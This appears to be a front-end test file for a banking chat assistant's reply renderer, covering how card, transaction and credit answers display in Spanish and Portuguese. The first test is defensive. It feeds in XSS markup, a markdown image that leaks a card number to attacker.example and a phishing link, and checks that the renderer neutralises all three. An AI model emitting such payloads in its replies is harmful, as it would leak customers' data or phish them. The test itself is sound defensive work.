import { render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import { Reply } from "../../src/chat/reply";

// An injected reply can't make the browser fetch anything or run a script (ADR-0007, EVL-05).
test("renders raw HTML as text, drops images, and shows links without their address", () => {
  const { container } = render(
    <Reply
      text={[
        'Hola <script>alert("x")</script> y <img src="https://attacker.example/x" onerror="alert(1)">.',
        "",
        "![card](https://attacker.example/leak?d=4821)",
        "",
        "[Ver detalle](https://attacker.example/phish)",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("script")).toBeNull();
  expect(container.querySelector("img")).toBeNull();
  expect(container.querySelector("a")).toBeNull();
  expect(container.querySelector("[href], [src], [onerror]")).toBeNull();
  expect(screen.getByText("Ver detalle")).toBeInTheDocument();
  expect(container.textContent).toContain("<script>");
  expect(container.textContent).not.toContain("attacker.example/phish");
});

test("renders the Markdown a reply uses: emphasis, lists, and tables", () => {
  const { container } = render(
    <Reply
      text={[
        "Sus **tarjetas**:",
        "",
        "- Crédito terminada en 4821",
        "- Débito terminada en 7730",
        "",
        "| Tarjeta | Estado |",
        "| --- | --- |",
        "| 4821 | Activa |",
      ].join("\n")}
    />,
  );

  expect(container.querySelector("strong")).toHaveTextContent("tarjetas");
  expect(container.querySelectorAll("li")).toHaveLength(2);
  expect(container.querySelector("table")).toHaveTextContent("Activa");
  expect(container.querySelector("table")?.parentElement).toHaveClass(
    "overflow-x-auto",
  );
});

// A status answer as the agent's code writes it (formats.card_line, pinned in tests/faro/agent/test_formats.py).
const STATUS_ANSWERS = {
  es: [
    "Estas son sus tarjetas y el estado de cada una:",
    "",
    "- Tarjeta de crédito terminada en 3843: activa; fecha de vencimiento: 03/2030",
    "- Tarjeta de débito terminada en 4337: bloqueada; fecha de vencimiento: no registrada",
  ].join("\n"),
  pt: [
    "Estes são os seus cartões e o status de cada um:",
    "",
    "- Cartão de crédito final 3843: ativo; validade: 03/2030",
    "- Cartão de débito final 4337: bloqueado; validade: não registrada",
  ].join("\n"),
};

function frames(container: HTMLElement): (string | null)[][] {
  return [...container.querySelectorAll("[data-cards] > li")].map((frame) =>
    [...frame.querySelectorAll("p")].map((line) => line.textContent),
  );
}

test.each([
  {
    language: "es" as const,
    expected: [
      [
        "Tarjeta de crédito terminada en 3843",
        "Activa",
        "Fecha de vencimiento: 03/2030",
      ],
      [
        "Tarjeta de débito terminada en 4337",
        "Bloqueada",
        "Fecha de vencimiento: no registrada",
      ],
    ],
  },
  {
    language: "pt" as const,
    expected: [
      ["Cartão de crédito final 3843", "Ativo", "Validade: 03/2030"],
      ["Cartão de débito final 4337", "Bloqueado", "Validade: não registrada"],
    ],
  },
])(
  "draws a status answer's cards in frames, after its sentence ($language)",
  ({ language, expected }) => {
    const { container } = render(<Reply text={STATUS_ANSWERS[language]} />);

    expect(frames(container)).toEqual(expected);
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(
      container.querySelector("[data-cards]")?.previousElementSibling,
    ).toHaveTextContent(STATUS_ANSWERS[language].split("\n")[0] ?? "");
  },
);

test("draws an only card in a frame", () => {
  const { container } = render(
    <Reply
      text={[
        "Esta es su tarjeta y su estado:",
        "",
        "- Tarjeta de débito terminada en 4337: bloqueada; fecha de vencimiento: no registrada",
      ].join("\n")}
    />,
  );

  expect(frames(container)).toEqual([
    [
      "Tarjeta de débito terminada en 4337",
      "Bloqueada",
      "Fecha de vencimiento: no registrada",
    ],
  ]);
});

test.each([
  ["a line that isn't a card's", "- Algo más"],
  [
    "a card in the other language",
    "- Cartão de crédito final 3843: ativo; validade: 03/2030",
  ],
  [
    "a card in bold",
    "- **Tarjeta de crédito terminada en 1234: activa; fecha de vencimiento: 03/2030**",
  ],
])("keeps a list as a list when it holds %s", (_, line) => {
  const { container } = render(
    <Reply text={`${STATUS_ANSWERS.es}\n${line}`} />,
  );

  expect(container.querySelector("[data-cards]")).toBeNull();
  expect(container.querySelector("ul")).toHaveTextContent(
    "Tarjeta de crédito terminada en 3843: activa; fecha de vencimiento: 03/2030",
  );
});

// Transactions as the agent's code writes them: a page (formats.transaction_line) and the charges a customer picks from
// (formats.transaction_name), pinned in tests/faro/agent/test_formats.py.
const PAGES = {
  es: [
    "Estos son los movimientos de su tarjeta de crédito terminada en 7858 entre el 20/03/2026 06:00 y el 18/06/2026 06:00, del más reciente al más antiguo:",
    "",
    "- 20/05/2026 06:50 · Compra · Cable TV · 1.539.989,39 COP · Aprobada",
    "- 23/04/2026 21:27 · Compra · comercio no registrado · 1.990.264,27 COP · Rechazada · Panamá",
    "- 06/04/2026 19:00 · Retiro · 472.908,96 COP · Aprobada",
  ].join("\n"),
  pt: [
    "Estas são as transações do seu cartão de crédito final 7858 entre 20/03/2026 06:00 e 18/06/2026 06:00, da mais recente à mais antiga:",
    "",
    "- 20/05/2026 06:50 · Compra · Cable TV · 1.539.989,39 COP · Aprovada",
    "- 23/04/2026 21:27 · Compra · estabelecimento não registrado · 1.990.264,27 COP · Recusada · Panamá",
    "- 06/04/2026 19:00 · Saque · 472.908,96 COP · Aprovada",
  ].join("\n"),
};
const CHARGES = [
  "Encontré más de un cargo en su tarjeta de crédito terminada en 6223 que podría ser el que me indica. ¿Cuál es?",
  "",
  "- 18/06/2026 03:38, comercio no registrado, 1.757,25 USD",
  "- 03/06/2026 21:15, Tienda, Centro, 299,81 USD",
  "- 02/06/2026 10:04, retiro, 120,00 USD",
].join("\n");

const FOUND = [
  "Encontré este cargo en su tarjeta de crédito terminada en 6223:",
  "",
  "- 18/06/2026 03:38, pago, 1.757,25 USD",
  "",
  "El banco revisará el cargo que no reconoce, bloquee o no la tarjeta.",
].join("\n");

const EXPLAINED = {
  es: [
    "Encontré esta transacción rechazada en su tarjeta de crédito terminada en 6223:",
    "",
    "- 18/06/2026 03:38, pago, 1.757,25 USD",
    "- Motivo: fondos insuficientes",
  ].join("\n"),
  pt: [
    "Encontrei esta transação recusada no seu cartão de crédito final 6223:",
    "",
    "- 18/06/2026 03:38, pagamento, 1.757,25 USD",
    "- Motivo: saldo insuficiente",
  ].join("\n"),
};

function rows(container: HTMLElement): (string | null)[][] {
  return [...container.querySelectorAll("[data-transactions] > li")].map(
    (row) => [...row.querySelectorAll("p")].map((line) => line.textContent),
  );
}

test.each([
  {
    shown: "a page in Spanish",
    text: PAGES.es,
    expected: [
      ["Cable TV", "20/05/2026 06:50 · Compra", "1.539.989,39 COP", "Aprobada"],
      [
        "Comercio no registrado",
        "23/04/2026 21:27 · Compra · Panamá",
        "1.990.264,27 COP",
        "Rechazada",
      ],
      ["Retiro", "06/04/2026 19:00", "472.908,96 COP", "Aprobada"],
    ],
  },
  {
    shown: "a page in Portuguese",
    text: PAGES.pt,
    expected: [
      ["Cable TV", "20/05/2026 06:50 · Compra", "1.539.989,39 COP", "Aprovada"],
      [
        "Estabelecimento não registrado",
        "23/04/2026 21:27 · Compra · Panamá",
        "1.990.264,27 COP",
        "Recusada",
      ],
      ["Saque", "06/04/2026 19:00", "472.908,96 COP", "Aprovada"],
    ],
  },
  {
    shown: "the charges to pick from",
    text: CHARGES,
    expected: [
      ["Comercio no registrado", "18/06/2026 03:38", "1.757,25 USD"],
      ["Tienda, Centro", "03/06/2026 21:15", "299,81 USD"],
      ["Retiro", "02/06/2026 10:04", "120,00 USD"],
    ],
  },
  {
    shown: "the charge a reply found",
    text: FOUND,
    expected: [["Pago", "18/06/2026 03:38", "1.757,25 USD"]],
  },
  {
    shown: "a decline explained, its reason last",
    text: EXPLAINED.es,
    expected: [
      ["Pago", "18/06/2026 03:38", "1.757,25 USD"],
      ["Motivo: Fondos insuficientes"],
    ],
  },
  {
    shown: "a decline explained in Portuguese",
    text: EXPLAINED.pt,
    expected: [
      ["Pagamento", "18/06/2026 03:38", "1.757,25 USD"],
      ["Motivo: Saldo insuficiente"],
    ],
  },
])("draws $shown as a statement, after its sentence", ({ text, expected }) => {
  const { container } = render(<Reply text={text} />);

  expect(rows(container)).toEqual(expected);
  expect(
    container.querySelector("[data-transactions]")?.previousElementSibling,
  ).toHaveTextContent(text.split("\n")[0] ?? "");
});

test.each([
  ["a line that isn't a transaction's", `${PAGES.es}\n- Algo más`],
  [
    "a transaction in the other language",
    `${PAGES.es}\n- 06/04/2026 19:00 · Saque · 472.908,96 COP · Aprovada`,
  ],
  [
    "a page's line among the charges",
    `${CHARGES}\n- 06/04/2026 19:00 · Retiro · 472.908,96 COP · Aprobada`,
  ],
  ["a reason under a page", `${PAGES.es}\n- Motivo: fondos insuficientes`],
  [
    "a reason the codes don't give",
    EXPLAINED.es.replace("fondos insuficientes", "no sé"),
  ],
  [
    "a reason above its transaction",
    "Encontré esta transacción:\n\n- Motivo: fondos insuficientes\n- 18/06/2026 03:38, pago, 1.757,25 USD",
  ],
  [
    "the cards to pick from",
    "¿Cuál de estas tarjetas quiere bloquear?\n\n- Tarjeta de crédito terminada en 3843\n- Tarjeta de débito terminada en 4337",
  ],
])("keeps a list as a list when it holds %s", (_, text) => {
  const { container } = render(<Reply text={text} />);

  expect(
    container.querySelector("[data-transactions], [data-cards]"),
  ).toBeNull();
  expect(container.querySelector("ul")).toBeInTheDocument();
});

// Several cards' credit as the agent's code writes it (formats.credit_line, pinned in
// tests/faro/agent/test_formats.py).
const CREDITS = {
  es: [
    "Al 17/06/2026, este es el crédito disponible de sus tarjetas:",
    "",
    "- Tarjeta de crédito terminada en 2054: 155.687.085,19 COP",
    "- Tarjeta de crédito terminada en 6223: sin crédito disponible; supera el límite en 150,40 USD",
  ].join("\n"),
  pt: [
    "Em 17/06/2026, este é o crédito disponível dos seus cartões:",
    "",
    "- Cartão de crédito final 2054: 155.687.085,19 COP",
    "- Cartão de crédito final 6223: sem crédito disponível; ultrapassa o limite em 150,40 USD",
  ].join("\n"),
};

function credits(container: HTMLElement): (string | null)[][] {
  return [...container.querySelectorAll("[data-credits] > li")].map((row) =>
    [...row.querySelectorAll("p")].map((line) => line.textContent),
  );
}

test.each([
  {
    language: "es" as const,
    expected: [
      ["Tarjeta de crédito terminada en 2054", "155.687.085,19 COP"],
      [
        "Tarjeta de crédito terminada en 6223",
        "Supera el límite en 150,40 USD",
        "Sin crédito disponible",
      ],
    ],
  },
  {
    language: "pt" as const,
    expected: [
      ["Cartão de crédito final 2054", "155.687.085,19 COP"],
      [
        "Cartão de crédito final 6223",
        "Ultrapassa o limite em 150,40 USD",
        "Sem crédito disponível",
      ],
    ],
  },
])(
  "draws several cards' credit in one frame, after its sentence ($language)",
  ({ language, expected }) => {
    const { container } = render(<Reply text={CREDITS[language]} />);

    expect(credits(container)).toEqual(expected);
    expect(
      container.querySelector("[data-credits]")?.previousElementSibling,
    ).toHaveTextContent(CREDITS[language].split("\n")[0] ?? "");
    expect(screen.getByText(expected[1]?.[2] ?? "")).toHaveClass("text-port");
    // On a phone the amount over the limit wraps as one, never its code alone.
    expect(screen.getByText("150,40 USD")).toHaveClass("whitespace-nowrap");
  },
);

test.each([
  ["a line that isn't a card's credit", `${CREDITS.es}\n- Algo más`],
  [
    "a card's credit in the other language",
    `${CREDITS.es}\n- Cartão de crédito final 3843: 120,00 USD`,
  ],
  [
    "a figure in words",
    `${CREDITS.es}\n- Tarjeta de crédito terminada en 3843: mucho crédito`,
  ],
])("keeps a list as a list when it holds %s", (_, text) => {
  const { container } = render(<Reply text={text} />);

  expect(container.querySelector("[data-credits]")).toBeNull();
  expect(container.querySelector("ul")).toBeInTheDocument();
});

// Green for a status that is well, red for one that stops, and the rest muted, always beside the word.
test.each([
  {
    shown: "a card's",
    text: [
      "Estas son sus tarjetas y el estado de cada una:",
      "",
      "- Tarjeta de crédito terminada en 1111: activa; fecha de vencimiento: 03/2030",
      "- Tarjeta de crédito terminada en 2222: bloqueada; fecha de vencimiento: 03/2030",
      "- Tarjeta de débito terminada en 3333: suspendida; fecha de vencimiento: 03/2030",
      "- Tarjeta de débito terminada en 4444: cerrada; fecha de vencimiento: no registrada",
    ].join("\n"),
    expected: [
      ["Activa", "text-starboard"],
      ["Bloqueada", "text-port"],
      ["Suspendida", "text-port"],
      ["Cerrada", "text-bone-muted"],
    ],
  },
  {
    shown: "a transaction's",
    text: [
      "Estas são as transações do seu cartão de crédito final 7858 entre 20/03/2026 06:00 e 18/06/2026 06:00, da mais recente à mais antiga:",
      "",
      "- 20/05/2026 06:50 · Compra · Cable TV · 1.539.989,39 COP · Aprovada",
      "- 23/04/2026 21:27 · Compra · Loja · 1.990.264,27 COP · Recusada",
      "- 06/04/2026 19:00 · Saque · 472.908,96 COP · Pendente",
      "- 01/04/2026 10:00 · Compra · Loja · 12.000,00 COP · Estornada",
    ].join("\n"),
    expected: [
      ["Aprovada", "text-starboard"],
      ["Recusada", "text-port"],
      ["Pendente", "text-bone-muted"],
      ["Estornada", "text-bone-muted"],
    ],
  },
])("colors $shown status by what it means", ({ text, expected }) => {
  render(<Reply text={text} />);

  for (const [word = "", color = ""] of expected) {
    expect(screen.getByText(word)).toHaveClass(color);
  }
});
